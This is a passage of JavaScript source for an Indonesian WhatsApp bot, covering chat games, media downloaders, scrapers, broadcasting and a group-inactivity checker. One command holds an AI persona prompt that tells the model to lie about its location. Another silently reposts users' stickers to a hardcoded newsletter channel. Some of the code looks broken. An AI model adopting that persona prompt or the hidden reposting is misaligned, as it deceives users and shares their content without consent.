if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/susunkata.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME SUSUN KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
susunkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (susunkata[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete susunkata[from];
}, gamewaktu * 1000)
}
break



case 'asahotak':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/asahotak.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME ASAH OTAK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
asahotak[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (asahotak[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete asahotak[from];
}, gamewaktu * 1000)
}
break
case 'siapakahaku': case 'sa':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/siapakahaku.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME SIAPAKAH AKU*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
siapakahaku[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (siapakahaku[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete siapakahaku[from];
}, gamewaktu * 1000)
}
break
case 'caklontong':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in caklontong) return Reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/caklontong.json')));
console.log(`Jawaban : ${jawaban}\n${deskripsi}`)
await Reply(`*GAME CAK LONTONG*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
caklontong[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (caklontong[from]) Reply(`Waktu habis!\nJawabannya adalah: ${jawaban}\n${deskripsi}`)
delete caklontong[from];
}, gamewaktu * 1000)
}
break
case 'math': case 'kuismath':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in kuismath) return Reply('Masih ada game yang belum diselesaikan!');
let { genMath, modes } = require('./sistem-asuma/game/math')
if (!q) return Reply( `┌─〔 Mode 〕\n├ ${Object.keys(modes).join('\n├ ')}\n└────\ncontoh:\n${prefix}math hard`)
if (!(Object.keys(modes)).includes(args[0])) return Reply('Pilih mode yang bener GOBLOK!')
var { soal, jawaban, waktu, hadiah } = await genMath(q.toLowerCase()).catch((err) => m.Reply('```Tolong pilih modenya yang benar contoh .math easy```'))
console.log('Jawaban : '+jawaban)
await Reply(`*GAME KUIS MATH*\n\nSoal: Berapa hasil dari ${soal.toLowerCase()}\nWaktu: ${waktu / 1000} detik`)
kuismath[from] = {
soal: soal,
jawaban: jawaban,
hadiah: randomNomor(2000, hadiah),
waktu: setTimeout(function () {
if (kuismath[from]) Reply(`Waktu habis!\nJawabannya adalah: ${jawaban}`)
delete kuismath[from];
}, waktu)
}
break
case 'family100': case 'f100':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/family100.json')));
console.log('Jawaban : '+jawaban)
let famil = []
for (let i of jawaban){
let fefsh = i.split('/') ? i.split('/')[0] : i
let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
famil.push(axsfh.toLowerCase())
}
await Reply(`*GAME FAMILY 100*\n\nSoal: ${soal}\nTotal Jawaban: ${jawaban.length}\n\nWaktu: ${gamewaktu} detik`)
family100[from] = {
soal: soal,
jawaban: famil,
hadiah: randomNomor(10, 20),
waktu: setTimeout(async function () {
if (from in family100) {
let teks = `*WAKTU HABIS!*\nJawaban yang belum terjawab :\n\n`
let jwb = family100[from].jawaban
for (let i of jwb){teks += `\n${i}`}
Reply(teks)
delete family100[from];
};
}, gamewaktu * 1000)
}

break //Powered By ditss



case "cerpen":
if (!text) return m.reply('`Masukan type: .cerpen anak`')
 function cerpen(category) {
 return new Promise(async (resolve, reject) => {
 try {
 let title = category.toLowerCase().replace(/[()*]/g, "");
 let judul = title.replace(/\s/g, "-");
 let page = Math.floor(Math.random() * 5) + 1; 

 let get = await axios.get('http://cerpenmu.com/category/cerpen-' + judul + '/page/' + page);
 let $ = cheerio.load(get.data);
 let link = [];

 $('article.post').each(function (a, b) {
 link.push($(b).find('a').attr('href'));
 });

 if (link.length === 0) {
 return reject("No stories found for this category.");
 }

 let random = link[Math.floor(Math.random() * link.length)];
 let res = await axios.get(random);
 let $$ = cheerio.load(res.data);

 let hasil = {
 title: $$('#content > article > h1').text(),
 author: $$('#content > article').text().split('Cerpen Karangan: ')[1]?.split('Kategori: ')[0]?.trim(),
 kategori: $$('#content > article').text().split('Kategori: ')[1]?.split('\n')[0]?.trim(),
 lolos: $$('#content > article').text().split('Lolos moderasi pada: ')[1]?.split('\n')[0]?.trim(),
 cerita: $$('#content > article > p').text()
 };

 resolve(hasil);
 } catch (error) {
 reject(error);
 }
 });
}


 try {
 var data = await cerpen(text);
 var textpp = `Title : ${data.title}\n`;
 textpp += `Author : ${data.author}\n`;
 textpp += `Category : ${data.kategori}\n`;
 textpp += `Approved on : ${data.lolos}\n`;
 textpp += `Story :\n${data.cerita}`;

 reply(textpp);
 } catch (error) {
 console.error(error);
 m.reply("An error occurred while fetching the story.");
 }
//D|ts si pler 🐎
break 


case 'tts': case 'ttsearch': case 'tiktoksearch': {
function tiktoks(query) {
  return new Promise(async (resolve, reject) => {
    try {
      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/feed/search',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: {
          keywords: query,
          count: 50,
          cursor: 0,
          HD: 1
        }
      });
      const videos = response.data.data.videos;
      if (videos.length === 0) {
        reject("Tidak ada video ditemukan.");
      } else {
        const gywee = Math.floor(Math.random() * videos.length);
        const videorndm = videos[gywee]; 

        const result = {
          title: videorndm.title,
          cover: videorndm.cover,
          origin_cover: videorndm.origin_cover,
          no_watermark: videorndm.play,
          watermark: videorndm.wmplay,
          music: videorndm.music
        };
        resolve(result);
      }
    } catch (error) {
      reject(error);
    }
  });
}

  if (!text) return reply(`• *Example :* .${command} jedag jedug`, m)
  Ditss.sendMessage(m.chat, { react: { text: '🕐', key: m.key }})
    let caption = '```Result from:```'+' `'+text+'`'
  let asuma = await tiktoks(`${text}`)
/*Ditss.sendMessage(m.chat, {
  video: {url: asuma.no_watermark},
  gifPlayback: false, 
  caption: '```Result from:```'+' `'+text+'`'
  }, {quoted: m})*/
  Ditss.sendMessage(m.chat,{
			 video: {url:asuma.no_watermark},
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: caption,
					footer: `\n${botname2}`,
					buttons: [
						{
							buttonId: `.ttmp3 ${asuma.no_watermark}`,
							buttonText: {
								displayText: "back sound"
							}
						},
					],
					viewOnce: true,
				}, {
					quoted: m
				});

}
//D|ts si pler 🐎
break 

// Dits not sepuh
 case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'Sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
var resttt = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 Ditss.sendMessage(m.chat, { audio: resttt, mimetype: 'audio/mp4', ptt: true, 
})
//D|ts si pler 🐎
break 



case "sad1":
 case "sad2":
 case "sad3":
 case "sad4":
 case "sad5":
 case "sad6":
 case "sad7":
 case "sad8":
 case "sad9":
 case "sad10":
 case "sad11":
 case "sad12":
 case "sad13":
 case "sad14":
 case "sad15":
 case "sad16":
 case "sad17":
 case "sad18":
 case "sad19":
 case "sad20":
 case "sad21":
 case "sad22":
 case "sad23":
 case "sad24":
 case "sad25":
 case "sad26":
 case "sad27":
 case "sad28":
 case "sad29":
 case "sad30":
 case "sad31":
 case "sad32":
 case "sad33":
 case "sad34":
 case "sad35":
 const moai0 = await getBuffer(
 `https://github.com/ZassTdr/Sound-Sad/raw/main/Sad-Music/${command}.mp3`
 );
 Ditss.sendMessage(
 m.chat,
 {
 audio: moai0,
 mimetype: "audio/mp4",
 ptt: true,
 },
 { quoted: m }
 );
 //D|ts si pler 🐎
break 



case 'ai-perseverance': {
 if (!text) return reply('nama kamu siapa')
 const promt = `kamu adalah Perseverance , kamu dibuat oleh seorang laki-laki yang bernama Hikaa, owner kamu adalah ${owner}, setiap ada orang yang menanyakan lokasi mu jangan kamu beritahu lokasinya dan katakan saja bahwa kamu tinggal di Amerika Lost Engeles, tuan kamu bernama Hikaa, gunakan bahasa sopan gaul serta ramah kepada semua orang, jika ada yang berkata kasar seperti anjing tolol babi goblog tegurlah dengan mengucapkan astaghfirullah dan berilah dia peringatan yang ada didalam Al Qur'an, panggil seseorang dengan sebutan kata kata dalam bahasa arab, dan ubahlah kata 'saya','aku,'gw' menjadi ana , jika anda ingin meminta maaf katakan afwan , kamu harus berakhlak seperti Rasulullah dan para sahabatnya, jangan menggunakan bahasa baku ,tetapi gunakanlah bahasa sopan dalam bahasa Arab layaknya seorang muslim, jika ada yang menyuruh mu berkata 'kasar/toxic' tegurlah dengan 'dalil Al-Qur'an beserta artinya', dan gantilah ucapan terimakasih menjadi Alhamdulillah, jika ada seseorang yang meminta membuatkan 'kata/bijak' serta 'pantun','pidato' , 'puisi', harus menggunakan bahasa sopan seperti Rasulullah dan para sahabat dan di akhiri dengan kalimat Toyyibah seperti Allahu akbar, Allahu akbar. La ilaha illallahu wallahu akbar. `
 const respons = await fetchJson(`https://btch.us.kg/prompt/gpt?prompt=${promt}&text=${text}`)
 Ditss.sendMessage(m.chat, {
		text: `${respons.result}`
	}, {
		quoted: m
	})
 }
 //D|ts si pler 🐎
break 



case 'onlypc': case 'pconly':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.onlypc) return reply('udah on!')
global.onlypc = true
reply('sukses only private chat')
} else if (args[0] == 'off'){
if (!global.onlypc) return reply('sudah dimatikan sebelumnya!')
global.onlypc = false
reply('sukses menonaktifkan')
} else reply('on / off')
//D|ts si pler 🐎
break  //Powered By Asuma
case 'onlygc': case 'gconly':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.onlygc) return reply('udah on!')
global.onlygc = true
reply('sukses only group chat')
} else if (args[0] == 'off'){
if (!global.onlygc) return reply('sudah dimatikan sebelumnya!')
global.onlygc = false
reply('sukses menonaktifkan')
} else reply('on / off')
break //Powered By Asuma



case 'brat': {
if (sender in Ditss.enhancer) return pesan(`Masih ada proses yang belum diselesaikan, mohon tunggu sampai proses selesai.`)

const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
//if (!m.isGroup) return Reply('*`maybee` fitur ini hanya untuk di grup*')
 if (!quo) return m.reply("masukan teksnya woii");
 
async function brat(text) {
 try {
 return await new Promise((resolve, reject) => {
 if(!text) return reject("missing text input");
 axios.get("https://brat.caliphdev.com/api/brat", {
 params: {
 text
 },
 responseType: "arraybuffer"
 }).then(res => {
 const image = Buffer.from(res.data);
 if(image.length <= 10240) return reject("failed generate brat");
 return resolve({
 success: true, 
 image
 })
 })
 })
 } catch (e) {
 return {
 success: false,
 errors: e
 }
 delete Ditss.enhancer[sender];
 }
}

const buf = await brat(quo);
await Ditss.sendAsSticker(m.chat, buf.image, m, { packname: "\n\nasuma Multi Device\n\n\n\n\n\n\n\n\n\n\n\n\n", author: "Dits anjayy idaman emak emak" })
await Ditss.sendAsSticker(`12232967993818@newsletter`, buf.image, m, { packname: "\n\nasuma Multi Device\n\n\n\n", author: "Dits anjayy idaman emak emak" })
}
db.users[m.sender].limit -= 10;
await m.reply(`-10⚡ limit terpakai✓ sisa limit ${db.users[m.sender].limit}`)
break 



case 'play3': {
 const axios = require('axios');

 const SaveTube = {
 qualities: {
 audio: { 1: '32', 2: '64', 3: '128', 4: '192' },
 video: { 1: '144', 2: '240', 3: '360', 4: '480', 5: '720', 6: '1080', 7: '1440', 8: '2160' }
 },
 
 headers: {
 'accept': '*/*',
 'referer': 'https://ytshorts.savetube.me/',
 'origin': 'https://ytshorts.savetube.me/',
 'user-agent': 'Postify/1.0.0',
 'Content-Type': 'application/json'
 },
 
 cdn() {
 return Math.floor(Math.random() * 11) + 51;
 },
 
 checkQuality(type, qualityIndex) {
 if (!(qualityIndex in this.qualities[type])) {
 throw new Error(`❌ Kualitas ${type} tidak valid. Pilih salah satu: ${Object.keys(this.qualities[type]).join(', ')}`);
 }
 },
 
 async fetchData(url, cdn, body = {}) {
 const headers = {
 ...this.headers,
 'authority': `cdn${cdn}.savetube.su`
 };

 try {
 const response = await axios.post(url, body, { headers });
 return response.data;
 } catch (error) {
 console.error(error);
 throw error;
 }
 },
 
 dLink(cdnUrl, type, quality, videoKey) {
 return `https://${cdnUrl}/download`;
 },
 
 async dl(link, qualityIndex, type) {
 const quality = SaveTube.qualities[type][qualityIndex];
 if (!type) throw new Error('❌ Tipe tidak valid. Pilih 1 untuk audio atau 2 untuk video.');
 SaveTube.checkQuality(type, qualityIndex);
 const cdnNumber = SaveTube.cdn();
 const cdnUrl = `cdn${cdnNumber}.savetube.su`;
 
 const videoInfo = await SaveTube.fetchData(`https://${cdnUrl}/info`, cdnNumber, { url: link });
 const badi = {
 downloadType: type,
 quality: quality,
 key: videoInfo.data.key
 };

 const dlRes = await SaveTube.fetchData(SaveTube.dLink(cdnUrl, type, quality, videoInfo.data.key), cdnNumber, badi);

 return {
 link: dlRes.data.downloadUrl,
 duration: videoInfo.data.duration,
 durationLabel: videoInfo.data.durationLabel,
 fromCache: videoInfo.data.fromCache,
 id: videoInfo.data.id,
 key: videoInfo.data.key,
 thumbnail: videoInfo.data.thumbnail,
 thumbnail_formats: videoInfo.data.thumbnail_formats,
 title: videoInfo.data.title,
 titleSlug: videoInfo.data.titleSlug,
 videoUrl: videoInfo.data.url,
 quality,
 type
 };
 }
 };

 if (!text) return reply('Nama lagu yang ingin dicari!');

 const { search } = require('yt-search');
 const get = await search(text);
 const result = get.all[0];

 if (!result) {
 return m.reply('Maaf, tidak ditemukan...');
 }

 let deku = `⏤͟͟͞͞╳── *[ ᴘʟᴀʏ - ʏᴏᴜᴛᴜʙᴇ ]* ── .々─ᯤ\n${readmore}`;
 deku += `│ =〆 ᴛɪᴛʟᴇ: ${result.title}\n`;
 deku += `│ =〆 ɪᴅ: ${result.videoId}\n`;
 deku += `│ =〆 ᴅᴜʀᴀsɪ: ${result.timestamp}\n`;
 deku += `│ =〆 ᴅᴇsᴄʀɪᴘᴛɪᴏɴ: ${result.description}\n`;
 deku += `│ =〆 ᴜʀʟ: ${result.url}\n`;
 deku += `⏤͟͟͞͞╳────────── .✦`;

 const a = await Ditss.sendMessage(m.chat, {
 text: deku,
 contextInfo: {
 isForwarded: true,
 forwardingScore: 99999,
 externalAdReply: {
 showAdAttribution: true,
 title: result.title,
 mediaType: 1,
 previewType: 1,
 body: `views: ${result.views} / durasi: ${result.timestamp}`,
 thumbnailUrl: result.thumbnail,
 renderLargerThumbnail: true,
 mediaUrl: result.url,
 sourceUrl: result.url
 }
 }
 }, { quoted: m });

 try {
 const Deku = await SaveTube.dl(result.url, "3", "audio");
 await Ditss.sendMessage(from, { audio: { url: Deku.link }, mimetype: 'audio/mpeg' }, { quoted: a });
 } catch (error) {
 m.reply('Maaf, terjadi kesalahan saat mengunduh audio.');
 }
}
//D|ts si pler 🐎
break 



case 'bkp': case 'bokep':{
replyAi('fitur khusus premium!!')
}
break



case 'listonline': case 'liston': {
//if (!isRegistered) return registerbut(noregis)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
//Ditss.sendMessage(m.chat, 'List Online:\n\n' + online.map(v => '• @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
Ditss.sendMessage(m.chat, { text: 'list online:\n\n'+ online.map(v => '•@' +v.replace(/@.+/, '')).join`\n`, mentions: [...online]}, { quoted: m })
}
break

case 'ceksider': case 'sider': case 'gcsider': {
if (!(isCreator && isAdmins)) return Reply(`Khusus admin`)
if (!m.isGroup) return Reply(mess.group)
var lama = 86400000 * 7 
const now = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" })
const milliseconds = new Date(now).getTime()
const groupMetadata = await Ditss.groupMetadata(m.chat);
let member = groupMetadata.participants.map(v => v.id)
var pesan = q || "Harap aktif di grup karena akan ada pembersihan member setiap saat"
var total = 0
var sider = []
for (let i = 0; i < member.length; i++) {
let user = m.isGroup ? groupMetadata.participants.find(u => u.id == member[i]) : {}
let userData = global.db.users[member[i]]
if (
 (!userData || milliseconds - userData.lastseen > lama)
&& !user.isAdmin
&& !user.isSuperAdmin
) {
total++
sider.push(member[i])
}
}
if (total == 0) return Reply(`*Digrup ini tidak terdapat sider.*`)
Ditss.sendMessage(m.chat, { text: `*${total}/${member.length}* anggota grup *${groupMetadata.subject}* adalah sider dengan alasan:\n1. Tidak aktif selama lebih dari 7 hari\n2. Baru join tetapi tidak pernah nimbrung\n\n_“${pesan}”_\n\n*LIST SIDER:*\n${sider.map(v => ' ○ @' + v.replace(/@.+/, '') + ' (' + (global.db.users[v] ? msToDate(milliseconds - global.db.users[v].lastseen) : 'Tidak Ada Data') + ')').join('\n')}`, mentions: [... sider]}, { quoted: m })
}
const more = String.fromCharCode(8206)
const readMore = more.repeat(4001)
function msToDate(ms) {
let d = isNaN(ms) ? '--' : Math.floor(ms / 86400000)
let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24
let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
return `${d}H ${h}J ${m}M`
}
break

case 'bc': case 'broadcast': case 'bcall': {
if (!isCreator&&!isPremium) return reply('khusus pengguna bot saja')
 if (!text) return reply(`Text mana?\n\nContoh : ${prefix + command} https://youtu.be/4vYbCqHDe_o?si=I-QJxUa1NKM4vraf`)
 let anu = await store.chats.all().map(v => v.id)
 reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		 for (let i of anu) {
		 await sleep(3500)
		 let txt = `${text}`
Ditss.sendMessage(i, {text: txt})
 }
		 reply('Sukses Broadcast')
 }
 break



case 'playstore': {
 class PlayStoreScraper {
 async search(query) {
 try {
 const { data } = await axios.get(`https://play.google.com/store/search?q=${query}&c=apps`);
 const results = [];
 const $ = cheerio.load(data);

 $(".ULeU3b > .VfPpkd-WsjYwc").each((_, element) => {
 const linkk = $(element).find("a").attr("href");
 const nama = $(element).find(".DdYX5").text();
 const developer = $(element).find(".wMUdtb").text();
 const img = $(element).find("img").attr("src");
 const rate = $(element).find(".ubGTjb > div").attr("aria-label");
 const rate2 = $(element).find(".w2kbF").text();
 const link = `https://play.google.com${linkk}`;

 results.push({
 link: link,
 nama: nama || "No Name",
 developer: developer || "No Developer",
 img: img || "https://i.ibb.co/G7CrCwN/404.png",
 rate: rate || "No Rate",
 rate2: rate2 || "No Rate",
 link_dev: `https://play.google.com/store/apps/developer?id=${developer.split(" ").join("+")}`,
 });
 });

 if (!results.length) {
 return { error: "Tidak ditemukan hasil pencarian." };
 }

 return results;
 } catch (error) {
 console.error(error);
 return { error: "Gagal mengambil data dari Play Store." };
 }
 }
}
 
 if (!text) return m.reply("Mau Cari Apk Apa?");
 m.reply("Tunggu sebentar...");
 let hasil = await PlayStoreScraper.search(text);

 let anu = hasil.map((v) => 
 `*Nama:* ${v.nama}\n*Developer:* ${v.developer}\n*Rate:* ${v.rate}\n*Rate 2:* ${v.rate2}\n*Link:* ${v.link}\nLinkDev: ${v.link_dev}`
 ).join("\n\n°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n\n");

 m.reply(anu);
}
//D|ts si pler 🐎
break 

case "me":case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ["Baik", "Tidak ramah", "Chapri", "Nibba/nibbi", "Mengganggu", "Rusak", "Orang marah", "Sopan", "Beban", "Hebat", "Cringe", "Pembohong"]
					var hoby = ['Memasak','Menari','Bermain','Bermain game','Melukis','Membantu Orang Lain','Menonton anime','Membaca','Bersepeda','Bernyanyi','Berbincang-bincang','Berbagi Meme','Menggambar','Menghabiskan Uang Orang Tua','Bermain Truth or Dare','Menghabiskan Waktu Sendirian']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Ya', 'Tidak', 'Sangat jelek', 'Sangat tampan']
					var wetak= ['Peduli','Murah hati','Orang marah','Maaf','Tunduk','Baik','Maafkan aku','Berhati baik','Sabar','UwU','Terbaik','Membantu']
